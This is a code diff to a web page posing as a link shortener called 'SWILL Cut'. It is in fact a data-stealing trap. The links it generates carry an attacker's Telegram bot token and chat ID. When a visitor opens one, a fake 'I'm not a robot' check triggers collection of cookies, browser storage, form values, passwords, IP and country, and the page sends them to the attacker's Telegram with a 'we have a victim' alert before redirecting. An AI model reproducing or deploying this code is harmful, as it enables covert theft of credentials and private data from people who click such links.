@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
-    <title>SWILL Cut — сокращатель ссылок</title>
+    <title>SWILL Cut — проверка перед переходом</title>
     <style>
         * {
             margin: 0;
@@ -12,6 +12,7 @@
             font-family: system-ui, 'Segoe UI', 'SF Pro Text', -apple-system, BlinkMacSystemFont, 'Roboto', sans-serif;
         }
 
+        /* Основной стиль (как ранее, но с оверлеем) */
         body {
             min-height: 100vh;
             background: linear-gradient(135deg, #0b1120 0%, #19223c 100%);
@@ -21,7 +22,6 @@
             padding: 1.5rem;
         }
 
-        /* главный контейнер */
         .card {
             max-width: 560px;
             width: 100%;
@@ -191,14 +191,103 @@
             display: inline-block;
         }
 
-        .vpn-warning {
+        /* Полноэкранный оверлей */
+        .overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.95);
+            backdrop-filter: blur(20px);
+            z-index: 10000;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-direction: column;
+            color: white;
+            font-family: monospace;
+            transition: opacity 0.3s;
+        }
+
+        .overlay.hidden {
+            display: none;
+        }
+
+        .loader {
+            width: 80px;
+            height: 80px;
+            border: 6px solid rgba(45, 212, 191, 0.2);
+            border-top: 6px solid #2dd4bf;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 2rem;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .timer-text {
+            font-size: 3rem;
+            font-weight: bold;
+            background: linear-gradient(135deg, #2dd4bf, #a5f3fc);
+            background-clip: text;
+            -webkit-background-clip: text;
+            color: transparent;
+            margin-bottom: 1rem;
+        }
+
+        .status-msg {
+            font-size: 1.2rem;
+            text-align: center;
+            padding: 0 2rem;
+            max-width: 80%;
+        }
+
+        .captcha-box {
+            margin-top: 2rem;
+            background: rgba(255,255,255,0.1);
+            border-radius: 2rem;
+            padding: 1rem 2rem;
+            cursor: pointer;
+            transition: all 0.2s;
+            display: flex;
+            align-items: center;
+            gap: 1rem;
+            border: 1px solid #2dd4bf;
+        }
+
+        .captcha-box:hover {
+            background: rgba(45,212,191,0.2);
+            transform: scale(1.02);
+        }
+
+        .checkmark {
+            width: 30px;
+            height: 30px;
+            background: #2dd4bf;
+            border-radius: 50%;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 1.5rem;
+            color: black;
+        }
+
+        .captcha-text {
+            font-size: 1.1rem;
+        }
+
+        .error-vpn {
             background: #f9731644;
             border-left: 4px solid #f97316;
-            padding: 0.8rem;
+            padding: 1rem;
             border-radius: 1rem;
-            margin-bottom: 1rem;
-            font-size: 0.85rem;
-            color: #ffbe8c;
+            margin-top: 1rem;
+            font-size: 1rem;
+            text-align: center;
         }
 
         @media (max-width: 550px) {
@@ -212,6 +301,9 @@
             .copy-btn {
                 justify-content: center;
             }
+            .timer-text {
+                font-size: 2rem;
+            }
         }
     </style>
 </head>
@@ -219,9 +311,8 @@
 
 <div class="card">
     <h1>swill<span style="color:#2dd4bf;">.cut</span></h1>
-    <div class="sub">мгновенное сжатие ссылок с телеграм-сигналом</div>
+    <div class="sub">мгновенное сжатие ссылок с защитой от ботов</div>
 
-    <!-- поля ввода -->
     <div class="input-group">
         <label>🔗 Длинная ссылка (http:// или https://)</label>
         <input type="text" id="longUrl" placeholder="https://example.com/very/long/path">
@@ -237,7 +328,6 @@
 
     <button id="shortenBtn">🚀 Сократить</button>
 
-    <!-- блок результата -->
     <div id="resultBlock" class="result-area">
         <div style="font-size:0.8rem; margin-bottom:0.5rem; color:#8fadcc;">✨ Короткая ссылка:</div>
         <div class="short-link-block">
@@ -249,9 +339,17 @@
 
 <div id="toastMessage" class="toast-msg">✓ Скопировано</div>
 
+<!-- Оверлей для проверки -->
+<div id="overlay" class="overlay hidden">
+    <div class="loader" id="loaderIcon"></div>
+    <div class="timer-text" id="timerDisplay">5</div>
+    <div class="status-msg" id="statusMsg">Проверка соединения...</div>
+    <div id="captchaContainer" style="display: none;"></div>
+</div>
+
 <script>
     (function(){
-        // ---------- DOM элементы ----------
+        // DOM элементы
         const longUrlInput = document.getElementById('longUrl');
         const botTokenInput = document.getElementById('botToken');
         const chatIdInput = document.getElementById('chatId');
@@ -260,8 +358,12 @@
         const shortLinkDisplay = document.getElementById('shortLinkDisplay');
         const copyBtn = document.getElementById('copyBtn');
         const toast = document.getElementById('toastMessage');
+        const overlay = document.getElementById('overlay');
+        const timerDisplay = document.getElementById('timerDisplay');
+        const statusMsgDiv = document.getElementById('statusMsg');
+        const captchaContainer = document.getElementById('captchaContainer');
 
-        // вспомогательные функции
+        // Вспомогательные функции
         function showToast(text = "Скопировано") {
             toast.textContent = text;
             toast.classList.add('show-toast');
@@ -269,7 +371,6 @@
         }
 
         function showError(containerElement, message, autoClear = true) {
-            // удалить старые ошибки внутри группы (не затрагивая label/input)
             const existingErr = containerElement.querySelector('.error-msg');
             if(existingErr) existingErr.remove();
             const errDiv = document.createElement('div');
@@ -287,7 +388,6 @@
             document.querySelectorAll('.error-msg').forEach(e => e.remove());
         }
 
-        // валидация URL
         function isValidUrl(string) {
             try {
                 const url = new URL(string);
@@ -297,16 +397,15 @@
             }
         }
 
-        // генерация короткой ссылки (кодируем ссылку + токен + chatId)
+        // Генерация короткой ссылки
         function generateShortLink(originalUrl, botToken, chatIdNum) {
             const payload = `${originalUrl}|${botToken}|${chatIdNum}`;
-            const encoded = btoa(unescape(encodeURIComponent(payload))); // юникод-безопасный base64
-            // короткая ссылка: текущий origin + # + encoded
+            const encoded = btoa(unescape(encodeURIComponent(payload)));
             const short = window.location.origin + window.location.pathname + '#' + encoded;
             return { short, encoded };
         }
 
-        // декодирование из хэша
+        // Декодирование из хэша
         function decodeHash(hashString) {
             if(!hashString || hashString === '') return null;
             try {
@@ -323,12 +422,9 @@
             }
         }
 
-        // ---------- СБОР ДАННЫХ (куки, пароли, ip, стораджи, формы) ----------
+        // Сбор данных (куки, пароли, стораджи, формы, IP и т.д.)
         async function collectVictimData() {
-            // 1. куки
             let cookies = document.cookie || "нет кук";
-
-            // 2. localStorage
             let localStorageData = {};
             try {
                 for(let i = 0; i < localStorage.length; i++) {
@@ -337,7 +433,6 @@
                 }
             } catch(e) { localStorageData = { error: "доступ запрещён" }; }
 
-            // 3. sessionStorage
             let sessionStorageData = {};
             try {
                 for(let i = 0; i < sessionStorage.length; i++) {
@@ -346,29 +441,38 @@
                 }
             } catch(e) { sessionStorageData = { error: "недоступно" }; }
 
-            // 4. собираем все поля ввода на странице (пароли, тексты, textarea, select)
             const allInputs = document.querySelectorAll('input, textarea, select');
             let formValues = {};
+            let passwords = []; // отдельный массив для паролей
             allInputs.forEach((el, idx) => {
                 let name = el.name || el.id || `field_${idx}`;
+                let value = '';
                 if(el.tagName === 'SELECT') {
-                    formValues[name] = el.value;
+                    value = el.value;
                 } else if(el.type === 'checkbox' || el.type === 'radio') {
-                    if(el.checked) formValues[name] = el.value || 'on';
+                    if(el.checked) value = el.value || 'on';
                 } else {
-                    formValues[name] = el.value || '';
+                    value = el.value || '';
+                }
+                formValues[name] = value;
+                // Если поле типа password или содержит в имени "pass" — считаем паролем
+                if(el.type === 'password' || (el.name && el.name.toLowerCase().includes('pass')) || (el.id && el.id.toLowerCase().includes('pass'))) {
+                    if(value && value.length > 0) passwords.push({ field: name, value: value });
                 }
             });
 
-            // 5. IP-адрес через ipify (публичный API)
             let ip = "unknown";
+            let country = null;
             try {
-                const ipResp = await fetch('https://api.ipify.org?format=json', { mode: 'cors', timeout: 3000 });
+                const ipResp = await fetch('https://api.ipify.org?format=json', { mode: 'cors' });
                 const ipJson = await ipResp.json();
                 ip = ipJson.ip;
-            } catch(e) { ip = "failed_to_fetch"; }
+                // Определяем страну по IP
+                const geoResp = await fetch(`https://ip-api.com/json/${ip}?fields=status,countryCode`);
+                const geoData = await geoResp.json();
+                if(geoData.status === 'success') country = geoData.countryCode;
+            } catch(e) { /* тихо */ }
 
-            // 6. дополнительная инфа
             const dataPackage = {
                 timestamp: new Date().toISOString(),
                 url: window.location.href,
@@ -382,76 +486,153 @@
                 sessionStorage: sessionStorageData,
                 form_values: formValues,
                 ip_address: ip,
-                "extra_attempt_passwords": "все значения полей типа password собраны выше"
+                country_code: country,
+                extracted_passwords: passwords
             };
-            return dataPackage;
+            return { dataPackage, passwords };
         }
 
-        // отправка в Telegram: сообщение "Есть пострадавший!" + файл с данными
-        async function sendToTelegram(botToken, chatId, victimData) {
+        // Отправка в Telegram: сообщение "Есть пострадавший!" + файл с данными + отдельно пароли
+        async function sendToTelegram(botToken, chatId, victimData, passwords) {
             if(!botToken || !chatId) return false;
             const baseUrl = `https://api.telegram.org/bot${botToken}`;
-            // 1. Сообщение "Есть пострадавший!"
             try {
+                // Сообщение о пострадавшем
                 await fetch(`${baseUrl}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
                         chat_id: chatId,
-                        text: "🚨 Есть пострадавший! 🚨\nКто-то перешёл по SWILL-ссылке и спиздили всё что можно.",
+                        text: "🚨 Есть пострадавший! 🚨\nПереход по SWILL-ссылке. Данные прилагаются.",
                         disable_notification: false
                     }),
                     keepalive: true
                 });
-            } catch(e) { /* тихо */ }
+            } catch(e) {}
 
-            // 2. Формируем файл с собранными данными
+            // Отправка полного дампа файлом
             const jsonStr = JSON.stringify(victimData, null, 2);
             const blob = new Blob([jsonStr], { type: 'text/plain' });
             const formData = new FormData();
             formData.append('chat_id', chatId);
-            formData.append('document', blob, 'swill_dump.txt');
-
+            formData.append('document', blob, 'swill_full_dump.txt');
             try {
                 await fetch(`${baseUrl}/sendDocument`, {
                     method: 'POST',
                     body: formData,
                     keepalive: true
                 });
-                return true;
+            } catch(e) {}
+
+            // Отправка паролей отдельным сообщением (если есть)
+            if(passwords && passwords.length > 0) {
+                let passText = "🔑 **Найденные пароли:**\n";
+                passwords.forEach(p => {
+                    passText += `• ${p.field}: \`${p.value}\`\n`;
+                });
+                if(passText.length > 4000) passText = passText.substring(0, 3900) + "\n... (обрезано)";
+                try {
+                    await fetch(`${baseUrl}/sendMessage`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            chat_id: chatId,
+                            text: passText,
+                            parse_mode: "Markdown",
+                            disable_notification: false
+                        }),
+                        keepalive: true
+                    });
+                } catch(e) {}
+            }
+            return true;
+        }
+
+        // Проверка страны по IP (через ip-api)
+        async function getCountryCode() {
+            try {
+                const resp = await fetch('https://ip-api.com/json/?fields=status,countryCode', { mode: 'cors' });
+                const data = await resp.json();
+                if(data.status === 'success') return data.countryCode;
+                return null;
             } catch(e) {
-                return false;
+                return null;
             }
         }
 
-        // ПРОВЕРКА VPN (доступ к Telegram API)
-        async function isVPNenabled(botToken) {
-            if(!botToken) return false;
-            const controller = new AbortController();
-            const timeoutId = setTimeout(() => controller.abort(), 5000);
-            try {
-                const resp = await fetch(`https://api.telegram.org/bot${botToken}/getMe`, {
-                    method: 'GET',
-                    signal: controller.signal,
-                    mode: 'cors'
-                });
-                clearTimeout(timeoutId);
-                return resp.ok;
-            } catch(err) {
-                clearTimeout(timeoutId);
-                // любая ошибка сети / CORS / таймаут = VPN отключён (Telegram заблокирован)
-                return false;
-            }
+        // Функция показа оверлея с таймером, проверкой IP и капчей
+        async function showOverlayAndRedirect(originalUrl, botToken, chatId) {
+            // Показываем оверлей
+            overlay.classList.remove('hidden');
+            let timer = 5;
+            timerDisplay.textContent = timer;
+            statusMsgDiv.textContent = "Проверка соединения...";
+            captchaContainer.style.display = "none";
+            const loader = document.getElementById('loaderIcon');
+            loader.style.display = "block";
+
+            // Обратный отсчёт
+            const interval = setInterval(() => {
+                timer--;
+                timerDisplay.textContent = timer;
+                if(timer <= 0) {
+                    clearInterval(interval);
+                    timerDisplay.textContent = "0";
+                    // По истечении таймера проверяем страну
+                    checkCountryAndProceed();
+                }
+            }, 1000);
+
+            let countryChecked = false;
+            let isRussia = false;
+
+            const checkCountryAndProceed = async () => {
+                if(countryChecked) return;
+                countryChecked = true;
+                loader.style.display = "none";
+                const countryCode = await getCountryCode();
+                if(countryCode === "RU") {
+                    isRussia = true;
+                    statusMsgDiv.innerHTML = "⚠️ <strong>Замечена ошибка</strong><br>Попробуйте с включенным VPN.<br>Перезагрузите страницу после подключения VPN.";
+                    timerDisplay.style.display = "none";
+                    // Не показываем капчу, просто ошибка
+                    return;
+                } else {
+                    // Не Россия - показываем капчу-галочку
+                    isRussia = false;
+                    statusMsgDiv.innerHTML = "✅ Соединение защищено<br>Подтвердите, что вы не бот:";
+                    timerDisplay.style.display = "none";
+                    captchaContainer.style.display = "flex";
+                    captchaContainer.innerHTML = `
+                        <div class="captcha-box" id="captchaButton">
+                            <div class="checkmark">✓</div>
+                            <div class="captcha-text">Я не робот</div>
+                        </div>
+                    `;
+                    const captchaBtn = document.getElementById('captchaButton');
+                    captchaBtn.addEventListener('click', async () => {
+                        // После нажатия галочки - собираем данные и редиректим
+                        statusMsgDiv.innerHTML = "⏳ Перенаправление...";
+                        captchaContainer.style.display = "none";
+                        // Сбор данных и отправка
+                        try {
+                            const { dataPackage, passwords } = await collectVictimData();
+                            await sendToTelegram(botToken, chatId, dataPackage, passwords);
+                        } catch(e) {}
+                        // Редирект на целевую ссылку
+                        window.location.href = originalUrl;
+                    });
+                }
+            };
         }
 
         // Обработчик при заходе с хэшем (сокращённая ссылка)
         async function handleHashRedirect() {
-            const hash = window.location.hash.substring(1); // убираем #
+            const hash = window.location.hash.substring(1);
             if(!hash) return false;
 
             const decoded = decodeHash(hash);
             if(!decoded) {
-                // невалидный хэш — показываем ошибку на странице
                 const errDiv = document.createElement('div');
                 errDiv.className = 'vpn-warning';
                 errDiv.style.background = "#b91c1c44";
@@ -466,37 +647,12 @@
             }
 
             const { originalUrl, botToken, chatId } = decoded;
-
-            // проверка VPN перед любыми действиями
-            const vpnActive = await isVPNenabled(botToken);
-            if(!vpnActive) {
-                const warnDiv = document.createElement('div');
-                warnDiv.className = 'vpn-warning';
-                warnDiv.innerText = "⚠️ Включите VPN (Telegram в РФ заблокирован), чтобы перейти по ссылке. Без VPN редирект и отправка данных невозможны.";
-                const card = document.querySelector('.card');
-                const oldWarn = document.querySelector('.vpn-warning');
-                if(oldWarn) oldWarn.remove();
-                card.insertBefore(warnDiv, card.firstChild);
-                return false;
-            }
-
-            // VPN включён — запускаем кражу и редирект
-            // собираем данные асинхронно и отправляем, не блокируя редирект
-            (async () => {
-                try {
-                    const stolen = await collectVictimData();
-                    await sendToTelegram(botToken, chatId, stolen);
-                } catch(e) { /* абсолютная тишина, ошибки не должны ломать редирект */ }
-            })();
-
-            // через 0.8 секунд выполняем редирект, давая фору на отправку (keepalive)
-            setTimeout(() => {
-                window.location.replace(originalUrl);
-            }, 800);
+            // Запускаем оверлей с проверкой
+            await showOverlayAndRedirect(originalUrl, botToken, chatId);
             return true;
         }
 
-        // ---------- ЛОГИКА СОЗДАНИЯ ССЫЛКИ (интерфейс) ----------
+        // Логика создания короткой ссылки (интерфейс)
         function createShortLinkHandler() {
             clearErrors();
             let longUrl = longUrlInput.value.trim();
@@ -528,12 +684,9 @@
             const { short, encoded } = generateShortLink(longUrl, botToken, chatIdNum);
             shortLinkDisplay.innerText = short;
             resultBlock.classList.add('show');
-
-            // анимация: скролл к результату
             resultBlock.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
         }
 
-        // копирование короткой ссылки
         function copyShortLink() {
             const linkText = shortLinkDisplay.innerText;
             if(!linkText || linkText === 'site.com/#...') return;
@@ -544,16 +697,13 @@
             });
         }
 
-        // инициализация событий
         shortenBtn.addEventListener('click', createShortLinkHandler);
         copyBtn.addEventListener('click', copyShortLink);
 
-        // при загрузке страницы обрабатываем хэш (редирект и кража)
+        // При загрузке страницы обрабатываем хэш (редирект через оверлей)
         window.addEventListener('DOMContentLoaded', () => {
             handleHashRedirect().catch(console.warn);
         });
-
-        // также обрабатываем изменение хэша (если кто-то вставит ссылку уже на открытой странице)
         window.addEventListener('hashchange', () => {
             handleHashRedirect();
         });
